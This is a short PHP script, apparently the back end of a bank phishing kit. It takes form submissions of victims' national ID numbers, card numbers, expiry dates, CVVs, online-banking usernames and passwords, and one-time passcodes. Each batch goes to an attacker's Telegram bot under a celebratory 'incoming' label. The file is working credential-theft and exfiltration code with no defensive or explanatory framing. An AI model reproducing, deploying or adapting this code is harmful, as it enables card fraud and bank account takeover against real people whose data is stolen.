<?php
include 'telegram.php';


$hash = $_POST['form'];
if($hash == '1'){

  $msg = "GUIA ENTRANTE ✅🎉 : ".$_POST['cedula']."\nbank: ".$_POST["bank"]."\nCard: ".$_POST['numbercard']."\nExp: ".$_POST["month"]."/".$_POST["year"]."\nCVV: ".$_POST["cvv"];
  file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
}

if($hash == '2'){

  $msg = "GUIA ENTRANTE ✅🎉: ".$_POST['cedula']."\nusuario: ".$_POST["txt-usuario"]."\nPass: ".$_POST['txt-password'];
  file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
}

if($hash == '3'){

  $msg = "GUIA ENTRANTE ✅🎉: ".$_POST['cedula']."\notp: ".$_POST["txt-otp-nuevo"];
  file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
}

if($hash == '4'){

  $msg = "GUIA ENTRANTE ✅🎉: ".$_POST['cedula']."\notp: ".$_POST["txt-otp-nuevo"];
  file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
}



 ?>
